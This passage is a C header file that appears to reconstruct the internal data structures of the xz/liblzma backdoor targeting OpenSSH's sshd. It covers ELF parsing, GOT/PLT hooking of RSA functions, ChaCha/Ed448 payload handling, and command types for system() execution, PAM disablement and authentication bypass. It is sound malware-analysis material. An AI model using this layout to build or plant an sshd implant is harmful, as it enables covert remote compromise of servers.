 elf_info_t *ldso; /* ld-linux/ld.so descriptor used when validating _rtld_global and patching audit tables. */
 elf_info_t *libc; /* glibc descriptor feeding libc_imports_t and the fake allocator glue. */
 elf_info_t *liblzma; /* liblzma descriptor that houses the hook blob and allocator overrides. */
 elf_info_t *libcrypto; /* libcrypto descriptor targeted by RSA/EVP hooks and audit trampolines. */
} elf_handles_t;

/*
 * Lightweight bootstrap record containing the `elf_handles_t`, the ld.so ELF header pointer, and an output slot for the resolved `__libc_stack_end` value; used while pivoting into the loader context.
 */
typedef struct __attribute__((packed)) main_elf {
 elf_handles_t *elf_handles; /* Pointer to the parsed ELF handles used during bootstrap (sshd/ldso/libc/liblzma/libcrypto). */
 Elf64_Ehdr *ldso_ehdr; /* ELF header for the dynamic linker mapping; used to re-parse ld.so when resolving __libc_stack_end. */
 void **libc_stack_end_slot; /* Output slot that receives the resolved __libc_stack_end pointer for later argv/envp access. */
} main_elf_t;

/*
 * Master structure built during the loader pass that holds every `link_map`, the parsed `elf_info_t` objects for key libraries, resolved libc imports, string references, and the fake allocator we expose to liblzma.
 */
typedef struct backdoor_data backdoor_data_t;

/*
 * Pairs the monolithic `backdoor_data_t` blob with its `elf_handles_t` so loader helpers can take one argument yet still access both structures.
 */
typedef struct __attribute__((packed)) backdoor_data_handle {
 backdoor_data_t *runtime_data; /* Aggregated loader/global state (link_map cache, string refs, imports, etc.) captured during init. */
 elf_handles_t *cached_elf_handles; /* Pointer to runtime_data->elf_handles so helpers can dereference ELF metadata without reaching through the enclosing blob. */
} backdoor_data_handle_t;

/*
 * Per-string entry storing the encoded literal ID (with padding for alignment), the bounded function range that references it, and the LEA xref.
 */
typedef struct __attribute__((packed)) string_item {
 EncodedStringId string_id; /* Identifier for the literal this entry tracks. */
 u32 padding; /* Alignment padding; unused by the heuristics. */
 void *func_start; /* Lower bound for the routine that references the string. */
 void *func_end; /* Upper bound after branch/reloc sweeps. */
 void *xref; /* LEA that materialises the string literal. */
} string_item_t;

/*
 * Ordered set of 27 `string_item_t` slots keyed by `StringXrefId` for the sshd/PAM/log anchors (xcalloc, monitor RPCs, sshlogv/syslog helpers) that drive the recon heuristics.
 */
typedef struct __attribute__((packed)) string_references {
 string_item_t xcalloc_zero_size; /* Zero-size xcalloc site that seeds sensitive-data scans. */
 string_item_t chdir_home_error; /* do_child chdir failure path. */
 string_item_t list_hostkey_types; /* main() hostkey banner anchor. */
 string_item_t demote_sensitive_data; /* demote_sensitive_data helper. */
 string_item_t mm_terminate; /* monitor mm_terminate RPC. */
 string_item_t mm_pty_allocate; /* monitor PTY allocation RPC. */
 string_item_t mm_do_pam_account; /* monitor PAM account RPC. */
 string_item_t mm_session_pty_cleanup2; /* monitor sess-pty cleanup helper. */
 string_item_t mm_getpwnamallow; /* monitor passwd lookup helper. */
 string_item_t mm_sshpam_init_ctx; /* monitor sshpam init. */
 string_item_t mm_sshpam_query; /* monitor sshpam query. */
 string_item_t mm_sshpam_respond; /* monitor sshpam respond. */
 string_item_t mm_sshpam_free_ctx; /* monitor sshpam ctx teardown. */
 string_item_t mm_choose_dh; /* monitor Diffie-Hellman chooser. */
 string_item_t sshpam_respond; /* server-side sshpam respond helper. */
 string_item_t sshpam_auth_passwd; /* server-side sshpam auth password helper. */
 string_item_t sshpam_query; /* server-side sshpam query helper. */
 string_item_t start_pam; /* start_pam helper. */
 string_item_t mm_request_send; /* monitor mm_request_send framing helper. */
 string_item_t mm_log_handler; /* mm_log_handler trampoline used to grab handler context. */
 string_item_t agent_socket_error; /* Agent-socket failure string that anchors the log-handler scan. */
 string_item_t auth_root_allowed; /* PermitRootLogin flag string. */
 string_item_t mm_answer_authpassword; /* monitor mm_answer_authpassword RPC. */
 string_item_t mm_answer_keyallowed; /* monitor mm_answer_keyallowed RPC. */
 string_item_t mm_answer_keyverify; /* monitor mm_answer_keyverify RPC. */
 string_item_t sshlogv_format; /* sshlogv formatter string anchoring sshlogv(). */
 string_item_t syslog_bad_level; /* Syslog-level fallback used to locate log handler wiring. */
} string_references_t;

/*
 * Master structure built during the loader pass that holds every `link_map`, the parsed `elf_info_t` objects for key libraries, resolved libc imports, string references, and the fake allocator we expose to liblzma.
 */
typedef struct __attribute__((packed)) backdoor_data {
 struct link_map *sshd_link_map; /* Live `link_map` entry for sshd’s main binary (aka r_debug->r_map head when basename is empty). */
 struct link_map *ldso_link_map; /* ld-linux / ld.so entry used when verifying _rtld_global and later when patching the audit tables. */
 struct link_map *liblzma_link_map; /* Active liblzma entry so we can locate the RW data segment housing the hook blob + allocator. */
 struct link_map *libcrypto_link_map; /* Live libcrypto entry whose `l_audit` fields get overwritten to redirect PLT binds. */
 struct link_map *libsystemd_link_map; /* Captured libsystemd entry; primarily used as a canary so the r_map walk sees the expected baseline. */
 struct link_map *libc_link_map; /* Live libc entry used for import resolution and syscalls proxied through the fake allocator. */
 elf_handles_t elf_handles; /* Parsed `elf_info_t` descriptors for {sshd, ld.so, libc, liblzma, libcrypto}. */
 backdoor_data_handle_t data_handle; /* Self-referential handle pairing this blob with `elf_handles` for helper callers. */
 elf_info_t main_info; /* Cached ELF metadata for sshd’s main binary. */
 elf_info_t dynamic_linker_info; /* Cached ELF metadata for ld.so (audit target). */
 elf_info_t libc_info; /* Cached ELF metadata for glibc. */
 elf_info_t liblzma_info; /* Cached ELF metadata for liblzma (where the hooks live). */
 elf_info_t libcrypto_info; /* Cached ELF metadata for libcrypto (RSA/EVP targets). */
 libc_imports_t libc_imports; /* Table of libc imports resolved once the libc rwx ranges are known. */
 string_references_t sshd_string_refs; /* Catalog of key sshd strings and their xrefs; drives the recon scans. */
 lzma_allocator saved_lzma_allocator; /* Copy of the ambient liblzma allocator callbacks (restored after we borrow them). */
 lzma_allocator *active_lzma_allocator; /* Live allocator pointer exposed to helpers; we swap its opaque pointer to resolve imports. */
} backdoor_data_t;

/*
 * Scratch arguments passed around while iterating dependent libraries; stitches together the master data blob, elf handles, resolved PLT stubs, and pointers back to the hook data so each pass can install the necessary trampolines.
 */
typedef struct __attribute__((packed)) backdoor_shared_libraries_data {
 backdoor_data_t *shared_maps; /* Aggregated link_map/elf_info blob populated while scanning r_debug. */
 elf_handles_t *elf_handles; /* Typed handles for each parsed ELF (main, libc, liblzma, etc.). */
 void **rsa_public_decrypt_slot; /* Address of the GOT/PLT slot we overwrite with our RSA_public_decrypt hook. */
 void **evp_set1_rsa_slot; /* Address of sshd’s EVP_PKEY_set1_RSA PLT entry for patching. */
 void **rsa_get0_key_slot; /* Address of sshd’s RSA_get0_key PLT entry for patching. */
 backdoor_hooks_data_t **hooks_data_slot; /* Pointer to the liblzma-resident hook blob pointer so we can stash the parsed address. */
 libc_imports_t *libc_imports; /* libc import table that needs resolving once libc is parsed. */
} backdoor_shared_libraries_data_t;

/*
 * Cursor for the secret-data bitstream: bit_position tracks the absolute offset, signed_bit_position is used for arithmetic, and the intra_byte_bit/byte_offset view exposes the decomposed byte+bit for callers that need to poke global_ctx->secret_data directly.
 */
typedef union {
 u32 bit_position; /* Absolute bit offset inside global_ctx->secret_data (0..0x1C7). */
 u32 index; /* Legacy alias for bit_position kept for existing helpers. */
 int signed_bit_position; /* Signed view for comparisons/subtractions during cursor arithmetic. */
 int signed_index; /* Legacy alias for signed_bit_position used by existing heuristics. */
 struct {
  u32 intra_byte_bit : 3; /* Bit number within the current byte (bit_position & 7). */
  u32 byte_offset : 29; /* Byte index inside the obfuscated log (bit_position >> 3). */
 };
} secret_data_shift_cursor_t;

/*
 * Descriptor for a single secret-data attestation entry: anchor_pc identifies the helper, bit_cursor selects the target slot in the obfuscated stream, operation_slot gates once-only execution, bits_to_shift feeds the accounting counter, and ordinal tracks the batch-assigned slot.
 */
typedef struct __attribute__((packed)) secret_data_item {
 u8 *anchor_pc; /* Instruction pointer identifying the helper/function we attest; used to locate the containing routine before appending. */
 secret_data_shift_cursor_t bit_cursor; /* Bit-stream cursor describing where this item lands inside the obfuscated secret data log. */
 u32 operation_slot; /* Index into global_ctx->shift_operations[] so each helper shifts at most once. */
 u32 bits_to_shift; /* Number of bits consumed/emitted when this descriptor succeeds (rolls into global_ctx->num_shifted_bits). */
 u32 ordinal; /* Non-zero slot ordinal assigned by secret_data_append_items_batch; zero marks disabled entries. */
} secret_data_item_t;

/*
 * First 16 bytes of every encrypted payload chunk. The stride/index/bias triple stays in plaintext so payload_stream_decrypt_and_append_chunk can reuse it as the ChaCha nonce, and rsa_backdoor_command_dispatch collapses it into monitor_data.cmd_type via (stride * index + bias) before committing to the payload.
 */
typedef struct __attribute__((packed)) backdoor_payload_hdr {
 u32 cmd_type_stride; /* Low 32 bits of the ChaCha nonce; multiplied with cmd_type_index before cmd_type_bias is applied. */
 u32 cmd_type_index; /* High 32 bits of the ChaCha nonce; second multiplicand in the cmd_type calculation. */
 int64_t cmd_type_bias; /* Signed bias added to the product; also forms the top half of the 16-byte nonce. */
} backdoor_payload_hdr_t;

/*
 * Two-byte overlay that lets us treat the final argument byte pair as either raw data or as a little-endian size value when computing payload lengths.
 */
typedef union __attribute__((packed)) {
 u8 value[2];
 u16 size;
} u_cmd_arguments_t;

/*
 * control_flags/monitor_flags/request_flags plus a two-byte payload_hint that collectively drive log-hook installs, PAM disablement, socket selection, monitor request IDs, and whether sshd_monitor_cmd_dispatch should stream payloads or patch ctx->sshd_offsets.
 */
typedef struct __attribute__((packed)) cmd_arguments {
 u8 control_flags; /* Primary toggles consumed by rsa_backdoor_command_dispatch()/sshd_monitor_cmd_dispatch: bit0 requests sshd exit after dispatch (propagates into ctx->exit_flag and calls libc_exit(0) on parse failures), bit1 asks sshd_install_mm_log_handler_hook() to run, bit2 requests setlogmask(-0x80000000), bit3 differentiates "squelch" logging from the filter mode, bit4 requires that the attacker-supplied format strings are present before enabling the filter, bit5 forces sshd_monitor_cmd_dispatch to use sshd_find_socket_fd_by_shutdown_probe() with the encoded socket ids, bit6 disables PAM by zeroing use_pam_ptr, and bit7 tells sshd_monitor_cmd_dispatch to wait for replies while letting opcode 0 treat the tail bytes as sshd_offsets overrides. */
 u8 monitor_flags; /* Secondary command byte: bit0 marks that continuation chunks include an 8-byte prefix before the little-endian size, bit1/bit2 tell rsa_backdoor_command_dispatch() that flags3/payload_hint carry sshd_offsets nibbles, bits3-5 hold the socket ordinal for cmd_type 0/1/2 when manual sockets are requested, and the high bits (0xC0) describe how cmd_type 3 sources payloads (0x40 = exit immediately, 0x00/0x80 = find the ChaCha blob on the stack, 0xC0 = payload_body/payload_body_size already populated). */
 u8 request_flags; /* Monitor/socket selector: the low 5 bits either override the MONITOR_REQ_* opcode or carry an additional socket index, bit5 advertises that sshd_monitor_cmd_dispatch must pull an sshbuf payload via sshd_find_forged_modulus_sshbuf(), and bit6 repurposes the tail bytes when opcode 0 patches ctx->sshd_offsets (see rsa_backdoor_command_dispatch()). */
 u_cmd_arguments_t payload_hint; /* Final two bytes reused as either a payload length (continuation chunks streamed into ctx->payload_buffer) or as raw bitfields when opcode 0 repacks ctx->sshd_offsets/monitor request selectors. */
} cmd_arguments_t;

/*
 * Decrypted payload body: a 0x72-byte Ed448 signature protecting the cmd flag bytes plus the attacker-supplied monitor payload staged at offset 0x87 of the modulus.
 */
typedef struct __attribute__((packed)) key_payload_body {
 u8 ed448_signature[114]; /* 0x72-byte Ed448 signature covering the decrypted cmd flags and payload bytes; verified against sshd host keys. */
 cmd_arguments_t cmd_flags; /* Three command flag bytes (plus the u_cmd_arguments_t union) that govern PAM/log toggles, socket selection, and continuation sizing semantics. */
 u8 monitor_payload[0x1A1]; /* Attacker-supplied body starting 0x87 bytes into the decrypted blob (0x10-byte header + 0x77-byte signed prefix); holds the monitor command stream/sshbuf data. */
} backdoor_payload_body_t;

/*
 * Full 0x228-byte decrypted payload buffer exposed both as a raw byte array for hashing and as the parsed {header, body} pair consumed by the RSA hooks.
 */
typedef struct __attribute__((packed)) backdoor_payload {
 union {
  u8 raw[0x228]; /* Entire decrypted payload blob (header + body) as a flat buffer for signature checks and monitor copies. */
  struct __attribute__((packed)) {
   backdoor_payload_hdr_t header; /* 16-byte nonce/cmd-type seeds pulled straight from the RSA modulus chunk. */
   backdoor_payload_body_t body; /* Ed448 signature block plus the parsed command flags and monitor payload stream. */
  };
 };
} backdoor_payload_t;

/*
 * Outer frame for each streamed chunk: ChaCha ciphertext that carries the plaintext header + length prefix + body, giving payload_stream_decrypt_and_append_chunk enough structure to stage the decrypted command bytes.
 */
typedef struct __attribute__((packed)) key_payload {
 backdoor_payload_hdr_t header; /* Plaintext 16-byte nonce/cmd seed reused directly by payload_stream_decrypt_and_append_chunk. */
 u16 encrypted_body_length; /* Little-endian body length in ciphertext; decrypted to learn how many bytes to copy. */
 u8 encrypted_body[1]; /* Variable-length ciphertext immediately following the length field. */
} key_payload_t;

/*
 * Stack scratch wrapper used by rsa_backdoor_command_dispatch: a 5-byte cmd_arguments_t prefix followed by the key_payload_t ciphertext chunk copied from the RSA modulus stream.
 */
typedef union __attribute__((packed)) key_payload_cmd_frame {
 u8 bytes[0x21d]; /* Raw view: 5-byte cmd_flags prefix + modulus ciphertext chunk (max 0x218 bytes). */
 struct __attribute__((packed)) {
  cmd_arguments_t cmd_flags; /* Scratch copy of the decrypted cmd flag bytes (control/monitor/request flags + payload_hint) staged before the ciphertext for easy access. */
  u8 header_bytes[16]; /* Plaintext payload header reused as the ChaCha nonce; see backdoor_payload_hdr_t for decoded {stride,index,bias}. */
  u16 encrypted_body_length; /* Little-endian body length in ciphertext; becomes valid plaintext after the first ChaCha pass. */
  u8 encrypted_body[0x206]; /* Ciphertext body bytes (max derived from rsa_backdoor_command_dispatch() modulus bounds: 0x218 - 0x10 - 2). */
 } fields;
} key_payload_cmd_frame_t;

/*
 * Interpretation of the first byte of the `cmd_arguments_t` block (packet sizing hints, PAM disablement, socket index encoding, etc.).
 */
enum CommandFlags1 {
 X_FLAGS1_8BYTES = 0x1,
 X_FLAGS1_SETLOGMASK = 0x4,
 X_FLAGS1_SOCKET_INDEX = 0x20,
 X_FLAGS1_DISABLE_PAM = 0x40,
 X_FLAGS1_NO_EXTENDED_SIZE = 0x80
};

/*
 * Second command flag byte which governs impersonation behaviour, monitor request overrides, auth bypass toggles, and which socket descriptor is referenced.
 */
enum CommandFlags2 {
 X_FLAGS2_IMPERSONATE = 0x1,
 X_FLAGS2_CHANGE_MONITOR_REQ = 0x2,
 X_FLAGS2_AUTH_BYPASS = 0x4,
 X_FLAGS2_CONTINUATION = 0x40,
 X_FLAGS2_PSELECT = 0xC0,
 X_FLAGS2_SOCKFD_MASK = 0x78
};

/*
 * Final command flag byte indicating the numeric socket identifier plus monitor request value derived from the payload.
 */
enum CommandFlags3 {
 X_FLAGS3_SOCKET_NUM = 0x1F,
 X_FLAGS3_MONITOR_REQ_VAL = 0x3F
};

typedef enum {
 MONITOR_CMD_CONTROL_PLANE = 0, /* Baseline command stream: updates sshd offsets/logging toggles and can stream continuation payloads through the forged monitor socket. */
 MONITOR_CMD_PATCH_VARIABLES = 1, /* Rewrites sshd globals (PermitRootLogin/use_pam/log hooks) before resuming the monitor loop. */
 MONITOR_CMD_SYSTEM_EXEC = 2, /* Runs attacker-provided setresuid/setresgid/system commands and optionally asks sshd_monitor_cmd_dispatch to exit afterwards. */
 MONITOR_CMD_PROXY_EXCHANGE = 3 /* Fully populate monitor_data_t and have sshd_monitor_cmd_dispatch forge a MONITOR_REQ_KEYALLOWED exchange on the chosen socket. */
} monitor_cmd_type_t;

/*
 * Working context for RSA-related operations; caches the cloned modulus/exponent, parsed cmd flags, decrypted payload bytes, the 32-byte host-key digest slot, ChaCha nonce/IV snapshots, and the attacker’s unwrapped Ed448 key (whose low 32 bytes double as the ChaCha key) so rsa_backdoor_command_dispatch can replay decryptions without re-reading secret_data.
 */
typedef struct __attribute__((packed)) key_ctx {
 const BIGNUM *rsa_modulus; /* RSA modulus returned by RSA_get0_key; reused when forging RSA_set0_key input. */
 const BIGNUM *rsa_exponent; /* RSA public exponent grafted onto the forged key context. */
 cmd_arguments_t cmd_args; /* Command flag triple parsed out of payload.body.cmd_flags. */
 backdoor_payload_t decrypted_payload; /* Entire decrypted payload blob (header + body) kept around for signature checks/replays. */
 u8 hostkey_digest[32]; /* SHA-256 digest of the current sshd host key before it is spliced into decrypted_payload. */
 u8 payload_nonce[16]; /* Plaintext nonce lifted from the payload header (cmd_type seeds) reused as the ChaCha nonce. */
 u8 chacha_iv[16]; /* ChaCha IV/counter snapshot so payload_stream_decrypt_and_append_chunk can rewind the keystream for replays. */
 u8 attacker_ed448_key[57]; /* Raw Ed448 public key bytes from secret_data_decrypt_with_embedded_seed (low 32 bytes double as the ChaCha key). */
 u8 ed448_key_align[2]; /* Padding to keep the struct 8-byte aligned after the 57-byte key. */
} key_ctx_t;

/*
 * Argument bundle that `rsa_backdoor_command_dispatch` hands to `sshd_monitor_cmd_dispatch`: it carries the decoded cmd opcode, parsed cmd_arguments_t flags, cloned RSA modulus/exponent, payload body pointer/size, and the RSA handle borrowed from OpenSSL.
 */
typedef struct __attribute__((packed)) monitor_data {
 monitor_cmd_type_t cmd_type; /* Attacker-defined opcode describing how sshd_monitor_cmd_dispatch should respond (control-plane updates, sshd variable patches, system() exec, or forged monitor exchanges). */
 u32 cmd_type_padding; /* High dword of the ChaCha-derived cmd index; left unused but keeps the runtime_data union 64-bit aligned. */
 cmd_arguments_t *args; /* Pointer to the decoded cmd flag bytes pulled from the decrypted payload body. */
 const BIGNUM *rsa_n; /* Modulus cloned from the staged RSA key (used when forging keyallowed/keyverify exchanges). */
 const BIGNUM *rsa_e; /* Public exponent cloned from the staged RSA key. */
 u8 *payload_body; /* Pointer to attacker-controlled monitor payload bytes (sshbuf fragments, serialized RPCs, etc.). */
 u16 payload_body_size; /* Length of payload_body that should be replayed into sshbuf/mm_request_send. */
 u8 payload_size_padding[6]; /* Alignment padding before the RSA* pointer; also reused when the union treats this area as scratch. */
 RSA *rsa; /* RSA handle supplied by OpenSSL; reused when emitting forged monitor packets. */
} monitor_data_t;

/*
 * Union that either exposes the fully-populated `monitor_data_t` or lets the caller treat the same memory as a flat 608-byte scratch buffer during staging.
 */
typedef union __attribute__((packed)) backdoor_runtime_data {
 monitor_data_t monitor;
 u8 data[608];
} backdoor_runtime_data_t;

/*
 * Full stack frame for `rsa_backdoor_command_dispatch`: tracks payload body/cipher sizing, the RSA hook’s do_orig flag, host key iteration counters, the staging union (socket receive buffers vs. staged Ed448 key material), plus the runtime monitor_data_t scratch and embedded `key_ctx_t` reused across commands.
 */
typedef struct __attribute__((packed)) run_backdoor_commands_data {
 u64 payload_body_size; /* Plaintext bytes (cmd flags + monitor payload) staged from the decrypted modulus. */
 BOOL *do_orig_flag; /* Pointer to the RSA hook's do_orig flag so failures can fall back to OpenSSL. */
 u64 payload_cipher_size; /* Ciphertext length carved out of the RSA modulus before payload_stream_decrypt_and_append_chunk runs. */
 u64 hostkey_digest_offset; /* Offset/cursor used while hashing sshd host keys and when reusing the buffer for patch commands. */
 RSA *rsa_handle; /* RSA handle supplied by OpenSSL; reused when forging monitor packets or rebuilding RSA_set0_key input. */
 u8 *payload_body_cursor; /* Pointer into ctx->payload_buffer where continuation chunks are copied. */
 u8 *ed448_key_cursor; /* Pointer to the Ed448 key bytes currently staged for signature verification or rotation. */
 u64 hostkey_count; /* Number of sshd host keys discovered through count_null_terminated_ptrs(). */
 u8 hostkey_index_align[4]; /* Alignment gap before the current host key index. */
 u32 hostkey_index; /* Index of the sshd host key currently being hashed/verified. */
 u64 last_hostkey_index; /* Previously verified host key index so continuation chunks can resume. */
 u8 staging_align[7]; /* Aligns the staging union on an 8-byte boundary. */
 u8 staging_mode; /* Flags describing whether staging carries socket RX state or host-key metadata. */
 union {
  struct __attribute__((packed)) {
   int fd; /* Socket descriptor returned by sshd_get_monitor_comm_fd/sshd_find_socket_fd_by_shutdown_probe. */
   u32 recv_size; /* Bytes remaining to read from the selected socket when streaming payloads. */
   u8 recv_buf[64]; /* Inline buffer used together with fd_read_full/pselect before copying into ctx->payload_buffer. */
  } socket_state;
  struct __attribute__((packed)) {
   u64 host_keys_available; /* Entries counted in ctx->sshd_sensitive_data->host_keys. */
   u64 host_pubkeys_available; /* Entries counted in ctx->sshd_sensitive_data->host_pubkeys. */
   u8 staged_ed448_key[57]; /* Ed448 public key bytes copied out of the decrypted payload. */
  } keyset;
 } staging;
 u8 runtime_align[7]; /* Padding so backdoor_runtime_data_t stays 8-byte aligned. */
 backdoor_runtime_data_t runtime; /* Either interpreted as monitor_data_t or as scratch bytes prior to sshd_monitor_cmd_dispatch. */
 key_ctx_t key_ctx; /* Cached modulus/exponent pointers plus the decrypted payload/nonce/digest bundle reused across commands. */
} run_backdoor_commands_data_t;

/*
 * Constant offsets harvested from liblzma that describe where the cpuid GOT slot and stage-two trampoline live so the hook can update them without rescanning instructions.
 */
typedef struct __attribute__((packed)) backdoor_cpuid_reloc_consts {
 ptrdiff_t random_cpuid_slot_offset_from_got_anchor; /* Delta from `cache_got_base_offset_from_cpuid_anchor`’s sentinel to the GOT entry storing `cpuid_random_symbol`; used to find the shimmed cpuid resolver. */
 u64 cpuid_stub_got_index; /* GOT index (as seen by liblzma’s cpuid IFUNC) for the slot we later overwrite with cpuid_ifunc_stage2_install_hooks. */
 ptrdiff_t stage2_trampoline_offset_from_got_anchor; /* Delta from the same GOT anchor to the `cpuid_ifunc_stage2_install_hooks` function pointer so the loader can jump to stage two without rescanning code. */
} backdoor_cpuid_reloc_consts_t;

/*
 * Similar relocation constants for the `__tls_get_addr` thunk so we can locate the PLT stub and randomized GOT slot at runtime.
 */
typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {
 ptrdiff_t plt_stub_offset_from_got_anchor; /* Delta applied to `cache_got_base_offset_from_cpuid_anchor`’s sentinel (`_Llzma_block_buffer_decode_0`) so helpers can jump straight into the `__tls_get_addr` PLT stub. */
 ptrdiff_t random_slot_offset_from_got_anchor; /* Delta from the relocation-safe GOT anchor (`elf_functions_offset`) to the randomized slot that holds `tls_get_addr_random_symbol`. */
} backdoor_tls_get_addr_reloc_consts_t;

typedef int (*init_hook_functions_fn)(backdoor_hooks_ctx_t *funcs);

typedef void *(*elf_symbol_get_addr_fn)(elf_info_t *elf_info, EncodedStringId encoded_string_id);

typedef BOOL (*elf_parse_fn)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);

/*
 * Mini vtable overlay stored in liblzma's encoders table; slots 1/4/6 are repurposed for init_hook_functions, elf_gnu_hash_lookup_symbol_addr, and elf_info_parse while the remaining slots stay unused to preserve the original layout.
 */
typedef struct __attribute__((packed)) elf_functions {
 u64 slot_0_unused; /* Unused table slot; preserved to match the liblzma layout. */
 init_hook_functions_fn init_hook_functions; /* Slot 1 (orig: lzma_delta_decoder_init). */
 u64 slot_2_unused; /* Unused table slot; preserved to match the liblzma layout. */
 u64 slot_3_unused; /* Unused table slot; preserved to match the liblzma layout. */
 elf_symbol_get_addr_fn elf_gnu_hash_lookup_symbol_addr; /* Slot 4 (orig: crc64_generic). */
 u64 slot_5_unused; /* Unused table slot; preserved to match the liblzma layout. */
 elf_parse_fn elf_info_parse; /* Slot 6 (orig: get_literal_price). */
} elf_functions_t;

/*
 * Dummy `lzma_allocator` instance that mimics the original callback table; used when the implant needs to satisfy allocation requests without delegating to libc.
 */
typedef struct __attribute__((packed)) fake_lzma_allocator {
 u64 reserved_allocator_slot;
 lzma_allocator allocator;
} fake_lzma_allocator_t;

typedef enum {
 AUDIT_PAT_EXPECT_LEA = 0, /* First state: wait for the LEA that materialises link_map::l_name plus the pointer displacement. */
 AUDIT_PAT_EXPECT_MOV = 1, /* Second state: verify the MOV copies the LEA result into the tracked register. */
 AUDIT_PAT_EXPECT_TEST = 2 /* Final state: require a TEST/BT against the tracked register before consuming the mask. */
} audit_pattern_state_t;

typedef union __attribute__((packed)) instruction_register_bitmap {
 struct __attribute__((packed)) {
  u16 allowed_regs; /* 16-bit mask over x86 GPR encodings (bit N -> reg N). */
  u8 reg_index; /* Captured register index (0-15) or 0xFF when unset. */
  u8 reserved; /* Padding/reserved byte; currently unused by the scanners. */
 } fields;
 struct __attribute__((packed)) {
  u16 low_word; /* Low 16-bit mask (same as fields.allowed_regs). */
  u16 high_word; /* High 16-bit view of {reg_index,reserved}. */
 } words;
 u32 raw_value; /* Raw view for shifts and byte-level updates. */
} instruction_register_bitmap_t;

typedef union __attribute__((packed)) instruction_search_offset {
 struct __attribute__((packed)) {
  u32 offset; /* 32-bit LEA displacement / field offset the scan expects. */
  u32 reserved; /* High dword; unused (keeps the ctx layout stable). */
 } dwords;
 u64 raw_value; /* Raw 64-bit view for zeroing/copying. */
} instruction_search_offset_t;

/*
 * Shared context for the instruction-search helpers; tracks the scan range, the byte pattern we expect, the output register captures, and provides access to hook/import state during complex searches.
 */
typedef struct __attribute__((packed)) instruction_search_ctx
{
 u8 *start_addr;
 u8 *end_addr;
 instruction_search_offset_t offset_to_match;
 instruction_register_bitmap_t *output_register_to_match;
 instruction_register_bitmap_t *output_register;
 BOOL result;
 u8 search_padding[4];
 backdoor_hooks_data_t *hooks;
 imported_funcs_t *imported_funcs;
} instruction_search_ctx_t;

extern BOOL sshd_monitor_cmd_dispatch(monitor_data_t *args, global_context_t *ctx);

extern BOOL x86_decode_instruction(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);

extern BOOL find_rel32_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);

extern BOOL find_lea_with_displacement(u8 *code_start, u8 *code_end, u64 displacement);

extern BOOL find_riprel_ptr_lea_or_mov_load(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 void *mem_address
);

extern BOOL find_riprel_lea(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 void *mem_address
);

extern BOOL find_riprel_grp1_imm8_memref(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 void *mem_address
);

extern BOOL find_riprel_mov_or_lea(
 u8 *code_start,
 u8 *code_end,
 BOOL is_64bit_operand,
 BOOL load_flag,
 dasm_ctx_t *dctx
);

extern BOOL find_riprel_mov(
 u8 *code_start,
 u8 *code_end,
 BOOL is_64bit_operand,
 BOOL load_flag,
 dasm_ctx_t *dctx
);

extern BOOL find_riprel_opcode_memref_ex(
 u8 *code_start,
 u8 *code_end,
 dasm_ctx_t *dctx,
 X86_OPCODE opcode,
 void *mem_address
);

extern BOOL is_endbr32_or_64(u8 *code_start, u8 *code_end, u32 low_mask_part);

extern u8 *find_string_lea_xref(
 u8 *code_start,
 u8 *code_end,
 const char *str
);

extern u8 *elf_find_encoded_string_xref_site(
 elf_info_t *elf_info,
 EncodedStringId encoded_string_id,
 u8 *code_start,
 u8 *code_end
);

extern BOOL find_reg_to_reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);

extern BOOL find_endbr_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);

extern BOOL find_function_bounds(
 u8 *code_start,
 void **func_start,
 void **func_end,
 u8 *search_base,
 u8 *code_end,
 FuncFindType find_mode);

extern BOOL elf_vaddr_range_has_pflags(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);

extern BOOL elf_vaddr_range_has_pflags_impl(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);

extern BOOL elf_vaddr_range_in_relro_if_required(elf_info_t *elf_info, u64 vaddr, u64 size, BOOL require_relro);

extern BOOL elf_info_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);

extern BOOL is_pt_gnu_relro(Elf64_Word p_type, u32 addend);

extern BOOL main_elf_resolve_stack_end_if_sshd(main_elf_t *main_elf);

extern char *argv_dash_option_contains_lowercase_d(char arg_first_char, char* arg_name);

extern BOOL sshd_validate_stack_argv_envp_layout(elf_info_t *elf, u8 *stack_end);

extern BOOL elf_build_string_xref_table(elf_info_t *elf_info, string_references_t *refs);

extern Elf64_Sym *elf_gnu_hash_lookup_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);

extern void *elf_gnu_hash_lookup_symbol_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);

extern void *elf_get_text_segment(elf_info_t *elf_info, u64 *pSize);

extern void *elf_get_rodata_segment_after_text(elf_info_t *elf_info, u64 *pSize);

extern void *elf_get_writable_tail_span(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);

extern void *elf_find_import_reloc_slot(
 elf_info_t *elf_info,
 Elf64_Rela *relocs,
 u32 num_relocs,
 u64 reloc_type,
 EncodedStringId encoded_string_id);

extern void *elf_find_plt_reloc_slot(elf_info_t *elf_info, EncodedStringId encoded_string_id);

extern void *elf_find_got_reloc_slot(elf_info_t *elf_info, EncodedStringId encoded_string_id);

extern Elf64_Rela *elf_rela_find_relative_slot(
 elf_info_t *elf_info,
 void *target_addr,
 u8 *slot_lower_bound,
 u8 *slot_upper_bound,
 ulong *resume_index_ptr);

extern Elf64_Relr *elf_relr_find_relative_slot(
 elf_info_t *elf_info,
 void *target_addr,
 u8 *slot_lower_bound,
 u8 *slot_upper_bound,
 ulong *resume_index_ptr);

extern BOOL elf_find_function_ptr_slot(
 StringXrefId xref_id,
 void **pOutCodeStart, void **pOutCodeEnd,
 void **pOutFptrAddr, elf_info_t *elf_info,
 string_references_t *xrefs,
 global_context_t *ctx);

extern char *elf_find_encoded_string_in_rodata(
 elf_info_t *elf_info,
 EncodedStringId *stringId_inOut,
 void *rodata_start_ptr);

extern lzma_allocator *get_fake_lzma_allocator(void);

extern fake_lzma_allocator_t *get_fake_lzma_allocator_blob(void);

